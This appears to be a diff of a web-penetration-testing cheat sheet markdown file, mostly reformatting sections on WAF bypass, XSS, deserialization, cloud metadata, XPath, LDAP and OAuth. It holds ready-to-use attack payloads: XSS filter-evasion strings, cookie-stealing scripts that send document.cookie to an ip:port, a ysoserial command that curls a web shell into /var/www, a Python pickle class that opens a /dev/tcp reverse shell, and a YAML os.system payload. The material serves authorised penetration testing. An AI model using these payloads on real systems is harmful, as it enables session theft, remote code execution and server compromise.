@@ -28,8 +28,7 @@ https://raw.githubusercontent.com/vmfae-iscteiulpt/imperva-detect/master/imperva
 -> bypass to find real ip in CloudFlare  
 https://github.com/zidansec/CloudPeler
 
-#### Others
-
+-> Others  
 https://github.com/0xInfection/Awesome-WAF
 
 ## Host Obfuscation
@@ -98,16 +97,14 @@ https://hackvertor.co.uk/public
 
 ### Protection XSS
 
--> XSS Auditor and XSS Filter
-
+-> XSS Auditor and XSS Filter  
 https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md  
 https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html  
 https://www.chromium.org/developers/design-documents/xss-auditor/  
 https://portswigger.net/daily-swig/xss-protection-disappears-from-microsoft-edge  
 https://developer.mozilla.org/pt-BR/docs/Web/HTTP/Headers/X-XSS-Protection
 
--> Wordlists for XSS Bypass
-
+-> Wordlists for XSS Bypass  
 https://gist.githubusercontent.com/rvrsh3ll/09a8b933291f9f98e8ec/raw/535cd1a9cefb221dd9de6965e87ca8a9eb5dc320/xxsfilterbypass.lst  
 https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/XSS-Bypass-Strings-BruteLogic.txt  
 https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/Intruder/xss-payload-list.txt  
@@ -126,7 +123,7 @@ http://www.businessinfo.co.uk/labs/mxss/
 
 https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
 
-### Regex blacklist filtering
+### Regex Blacklist Filtering
 
 (on\w+\s*=)
 ```
@@ -151,9 +148,9 @@ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
   
 <svg onload%0B=alert(1)>
 ```
-### Keyword based in filter
+### Keyword Based in Filter
  
-#### blocked - alert - bypass
+#### Alert Blocked - Bypass
   
 `<script>\u0061lert(1)</script>`
   
@@ -177,10 +174,8 @@ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
 
 Ex:
  
--> decode URI + unescape method
-  
+-> decode URI + unescape method  
 `decodeURI(/alert(%22xss%22)/.source)`
-  
 `decodeURIComponent(/alert(%22xss%22)/.source)`
   
 Add execution sink for execution:
@@ -190,9 +185,7 @@ Add execution sink for execution:
 ### Escaping Parentheses
   
 `<img src=x onerror="\u0061lert(1)"/>`
-  
 `<img src=x onerror="eval('\141lert(1)')"/>`
-
 `<img src=x onerror="eval('\x61lert(1)')"/>`
 
 ### Others Examples
@@ -238,15 +231,23 @@ Dom Based
 
 ### JavaScript Encoding and Compressor:
 
--> jjencode, aaencode, jsfuck, Minifying,Packer
+-> jjencode
+
+-> aaencode
+
+-> jsfuck
+
+-> Minifying
+
+-> Packer
 
 ### Decoder - Obfuscation (PHP and Javascript Decoder)
   
 https://malwaredecoder.com/
 
 ## XSS - Session Hijacking
-  
-ex:
+
+-> Examples
   
 `<script type=“text/javascript”>document.location=“http://ip:port/?cookie=“+document.cookie;</script>`
 `<script>window.location="http://ip:port/?cookie="+document.cookie;</script>`
@@ -289,36 +290,32 @@ Public \<s>
  
 Ex:
 
-O:4:"Okay":1:{s:8:"filepath";s:11:"/tmp/ok.txt";}
+`O:4:"Okay":1:{s:8:"filepath";s:11:"/tmp/ok.txt";}`
   
 Protected \0 * \0
 
 Ex:
 
-O:4:"Okay":1:{s:11:"' . "\0" . '*' . "\0" . 'filepath";s:11:"/tmp/ok.txt";}
+`O:4:"Okay":1:{s:11:"' . "\0" . '*' . "\0" . 'filepath";s:11:"/tmp/ok.txt";}`
 
 Private \0 \<s> \0
 
 Ex:
   
-O:4:"Okay":1:{s:14:"' . "\0" . 'Okay' . "\0" . 'filepath";s:11:"/tmp/ok.txt";}
-
-codes/deserialization/example.php
+`O:4:"Okay":1:{s:14:"' . "\0" . 'Okay' . "\0" . 'filepath";s:11:"/tmp/ok.txt";}`
   
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/deserialization/php/example.php
   
 #### Trick Bypass
 
-a:2:{s:8:"anything";o:4:"Okay":1:{s:8:"filepath";s:11:"/tmp/ok.txt";}}
+`a:2:{s:8:"anything";o:4:"Okay":1:{s:8:"filepath";s:11:"/tmp/ok.txt";}}`
 
 ### Tool
 
 https://github.com/ambionics/phpggc
   
-### Others 
+### Others
 
-codes/deserialization/php/token_hmac_sha1.php
-  
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/deserialization/php/token_hmac_sha1.php
 
 ### .NET Deserialization
@@ -361,85 +358,78 @@ https://www.bugku.net/runtime-exec-payloads/
 
 #### Tools
 
-https://github.com/frohoff/ysoserial
-
-https://github.com/NickstaDB/SerializationDumper
-
+https://github.com/frohoff/ysoserial  
+https://github.com/NickstaDB/SerializationDumper  
 https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java
   
 #### Script
-  
-codes/deserialization/java/gserial.sh
-  
-https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/deserialization/java/gserial.sh
-  
-codes/deserialization/java/payload.txt
 
-https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/deserialization/java/payloads.txt
-  
+```
 while read payload; 
-  
 do echo "$payload\n\n"; 
-  
-java -jar ysoserial.jar $payload "sleep 5" | base64 | tr -d '\n' > $payload.ser; 
-  
+java -jar ysoserial.jar $payload "sleep 5" | base64 | tr -d '\n' > $payload.ser;  
 echo "-----------------Loading-----------------\n\n"; done < payloads.txt
- 
+```
+https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/deserialization/java/gserial.sh  
+https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/deserialization/java/payloads.txt
+
 #### Signals
   
--> Bad Sign
-
+-> Bad Sign  
 ClassNot FoundException
 
--> Good Sign
-
+-> Good Sign  
 java.io.IOException
   
 #### JRMPListener and JRMPClient (CommonsCollections)
   
-java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 80 CommonsCollections “curl http://ip:port/shell.php -o /var/www/shell.php”
-
-java -jar ysoserial-all.jar “JRMPClient” ip:80” |base64 -w0
+`java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 80 CommonsCollections “curl http://ip:port/shell.php -o /var/www/shell.php”`
+`java -jar ysoserial-all.jar “JRMPClient” ip:80” |base64 -w0`
   
 ### Python Deserialization
 
 #### Pickle
-  
-codes/deserialization/python/py_pickle.py
+```
+import pickle
+import os
+from base64 import b64decode,b64encode
 
+class malicious(object):
+    def __reduce__(self):
+        return (os.system, ("/bin/bash -c \"/bin/sh -i >& /dev/tcp/ip/port 0>&1\"",))
+
+ok = malicious()
+ok_serialized = pickle.dumps(ok)
+print(b64encode(ok_serialized))
+```
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/deserialization/python/py_pickle.py
 
 ### YAML Deserialization
   
-codes/deserialization/exploit.yaml
-
+`!!python/object/apply:os.system ["sleep 5"]`  
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/deserialization/yaml/exploit.yaml
   
 ## Cloud
 
 ### Meta-data
 
-http://169.254.169.254/latest/meta-data
-
-http://169.254.169.254/latest/api/token
+`curl http://169.254.169.254/latest/meta-data`
+`http://169.254.169.254/latest/api/token`
 
 ### Serverless Injection
 
-echo "hi" > ok.txt && aws s3 cp ok.txt 's3://<BUCKET>/' -acl -public-read
+`echo "hi" > ok.txt && aws s3 cp ok.txt 's3://<BUCKET>/' -acl -public-read`
   
 ### Tools
 
-https://github.com/clarketm/s3recon
- 
+https://github.com/clarketm/s3recon  
 https://github.com/RhinoSecurityLabs/pacu
   
 ## XPATH
   
-error()
-
-* and doc('http://hacker.site/')
-  
-* and doc('http://hacker.site/', name(/*) ))
+`error()` 
+`* and doc('http://hacker.site/')`
+`* and doc('http://hacker.site/', name(/*) ))`
   
 ### Tools
   
@@ -451,14 +441,13 @@ https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/I
 
 ## LDAP Injection
 
-objectClass=*
+`https://site.com/item?objectClass=*`
 
-(&(sn=administrator)(password=*))
+`(&(sn=administrator)(password=*))`
   
 ### Docs
   
-https://tldp.org/HOWTO/archived/LDAP-Implementation-HOWTO/schemas.html
-  
+https://tldp.org/HOWTO/archived/LDAP-Implementation-HOWTO/schemas.html  
 https://book.hacktricks.xyz/pentesting-web/ldap-injection
 
 ## Attacking OAuth
@@ -467,16 +456,16 @@ https://book.hacktricks.xyz/pentesting-web/ldap-injection
 
 1- 
   
-GET /authorization?client_id=\<client_id>&redirect_uri=https://site.com/callback&response_type=code&scope=openid%20profile%20email HTTP/1.1
-  
+```
+GET /authorization?client_id=<client_id>&redirect_uri=https://site.com/callback&response_type=code&scope=openid%20profile%20email HTTP/1.1  
 Host: site.com
-
+```
 2-
   
-GET /callback?code=\<code> HTTP/1.1
-  
+```
+GET /callback?code=<code> HTTP/1.1
 Host: site.com
-  
+```
 Vulnerability Forced OAuth profile linking
   
 -> CSRF
